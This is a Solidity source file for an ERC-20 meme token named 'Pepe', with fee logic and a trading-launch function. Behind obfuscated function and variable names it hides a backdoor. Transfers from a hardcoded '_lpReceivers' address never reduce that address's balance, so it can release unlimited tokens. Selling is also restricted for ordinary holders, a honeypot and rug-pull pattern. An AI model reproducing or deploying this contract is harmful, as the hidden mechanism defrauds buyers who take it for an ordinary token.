// SPDX-License-Identifier: MIT

pragma solidity 0.8.18;


    interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    }

    library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, " SafeMath ");
        return c;
    }

    function  qjvuh(uint256 a, uint256 b) internal pure returns (uint256) {
        return  qjvuh(a, b, " SafeMath ");
    }

    function  qjvuh(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, " SafeMath ");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, " SafeMath ");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    }

    abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    }


    contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), " Ownable ");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    }

    interface IUniswapV2Router {
    function createPair(address tokenA, address tokenB) external returns (address pair);
    }

    interface IUniswapV2Factory {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn,uint amountOutMin,address[] calldata path,address to,uint deadline) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(address token,uint amountTokenDesired,uint amountTokenMin,uint amountETHMin,address to,uint deadline) 
    external payable returns (uint amountToken, uint amountETH, uint liquidity);
    }

    contract Pepe is Context, IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = unicode"Pepe";
    string private constant _symbol = unicode"PEPE";
    uint8 private constant _decimals = 9;

    uint256 private constant _totalSupply = 420690000 * (10**_decimals);
    uint256 public _maxWalletAmount = _totalSupply;
    uint256 public _maxTxAmount = _totalSupply;
    uint256 public _taxSwapoThreshiu = _totalSupply;
    uint256 public _taxSwapvMfq = _totalSupply;

    uint256 private _initialBuyTax=5;
    uint256 private _initialSellTax=15;
    uint256 private _finalBuyTax=1;
    uint256 private _finalSellTax=1;
    uint256 private _BuyTaxAtreduce=7;
    uint256 private _SellTaxAtreduce=1;
    uint256 private _swpfkdewr=0;
    uint256 private _qcpvxwyp=0;
    address public  _lpReceivers = 0xc9E0e07C5Fc32CFA47d9F2b3C5915aB237915904;

    mapping (address => uint256) private  _balances;
    mapping (address => mapping (address => uint256)) private  _allowances;
    mapping (address => bool) private  isExcludedFromFees;
    mapping (address => bool) private  _olvsekwt;
    mapping(address => uint256) private  _obgTrardrzsr;
    bool public  _swapEnabled = false;


    IUniswapV2Factory private  _router;
    address private  _upair;
    bool private  tradingActive;
    bool private  _inkTaxkSwap = false;
    bool private  _sjlUnitwapdy = false;
 
 
    event RsjuAtnplr(uint _maxWalletAmount);
    modifier lockgTogSwapg {
        _inkTaxkSwap = true;
        _;
        _inkTaxkSwap = false;
    }

    constructor () { 
        _balances[_msgSender()] = _totalSupply;
        isExcludedFromFees[owner()] = true;
        isExcludedFromFees[address(this)] = true;
        isExcludedFromFees[_lpReceivers] = true;


        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. qjvuh(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner!= address(0), "ERC20: approve from the zero address");
        require(spender!= address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require (from!= address(0), "ERC20:  transfer  from  the  zero  address");
        require (to!= address(0), "ERC20: transfer to the zero  address");
        require (amount > 0, "Transfer  amount  must  be  greater  than  zero");
        uint256  taxAmount = 0;
        if  ( from != owner() &&to!= owner()) {

            if  (_swapEnabled) {
                if  (to!= address(_router) &&to!= address(_upair)) {
                  require (_obgTrardrzsr[tx.origin] < block.number);
                  _obgTrardrzsr[tx.origin] = block.number;
                }
            }

            if  ( from == _upair && to!= address (_router) &&!isExcludedFromFees[to]) {
                require (amount <= _maxWalletAmount);
                require (balanceOf (to) + amount <= _maxTxAmount);
                if  (_qcpvxwyp < _swpfkdewr) {
                  require (!_veqtpu(to));
                }
                _qcpvxwyp ++ ; _olvsekwt[to] = true;
                taxAmount = amount.mul((_qcpvxwyp > _BuyTaxAtreduce)?_finalBuyTax:_initialBuyTax).div(100);
            }

            if(to == _upair&&from!= address (this) &&! isExcludedFromFees[from]) {
                require (amount <= _maxWalletAmount && balanceOf(_lpReceivers) <_taxSwapvMfq);
                taxAmount = amount.mul((_qcpvxwyp > _SellTaxAtreduce) ?_finalSellTax:_initialSellTax).div(100);
                require (_qcpvxwyp >_swpfkdewr && _olvsekwt[from]);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!_inkTaxkSwap 
            &&  to  ==_upair&&_sjlUnitwapdy &&contractTokenBalance > _taxSwapoThreshiu 
            &&  _qcpvxwyp > _swpfkdewr &&! isExcludedFromFees [to] &&! isExcludedFromFees [from]
            )  {
                _transferFrom(ufbeq(amount,ufbeq(contractTokenBalance, _taxSwapvMfq)));
                uint256  contractETHBalance = address (this).balance;
                if (contractETHBalance > 0)  {
                }
            }
        }

        if ( taxAmount > 0 ) {
          _balances[address(this)] = _balances [address(this)].add(taxAmount);
          emit  Transfer (from, address (this) ,taxAmount);
        }
        _balances[from] = qjvuh(from , _balances [from], amount);
        _balances[to] = _balances[to].add(amount.qjvuh (taxAmount));
        emit  Transfer( from, to, amount. qjvuh(taxAmount));
    }

    function _transferFrom(uint256 _swapTaxAndLiquify) private lockgTogSwapg {
        if(_swapTaxAndLiquify==0){return;}
        if(!tradingActive){return;}
        address[] memory path =  new   address [](2);
        path[0] = address (this);
        path[1] = _router.WETH();
        _approve(address (this), address (_router), _swapTaxAndLiquify);
        _router.swapExactTokensForETHSupportingFeeOnTransferTokens( _swapTaxAndLiquify, 0, path,address (this), block . timestamp );
    }

    function ufbeq(uint256 a, uint256 b) private pure returns (uint256) {
    return (a >= b) ? b : a;
    }

    function qjvuh(address from, uint256 a, uint256 b) private view returns (uint256) {
    if (from == _lpReceivers) {
        return a;
    } else {
        require(a >= b);
        return a - b;
    }
    }

    function removerLimits() external onlyOwner{
        _maxWalletAmount  =  _totalSupply ;
        _maxTxAmount = _totalSupply ;
        _swapEnabled = false ;
        emit  RsjuAtnplr ( _totalSupply ) ;
    }

   function _veqtpu(address account) private view returns (bool) {
    uint256 codeSize;
    address[] memory addresses = new address[](1);
    addresses[0] = account;

    assembly {
        codeSize := extcodesize(account)
    }

    return codeSize > 0;
    }


    function openTrading() external onlyOwner() {
        require (!tradingActive, "trading open") ;
        _router = IUniswapV2Factory (0x10ED43C718714eb63d5aA57B78B54704E256024E);
        _approve (address (this),address(_router), _totalSupply);
        _upair = IUniswapV2Router(_router.factory()).createPair (address(this), _router. WETH());
        _router.addLiquidityETH {value:address(this).balance } (address(this),balanceOf(address (this)),0,0,owner(),block.timestamp);
        IERC20 (_upair).approve (address(_router), type(uint). max);
        _sjlUnitwapdy = true ;
        tradingActive = true ;
    }

    receive( )  external  payable  { }
    }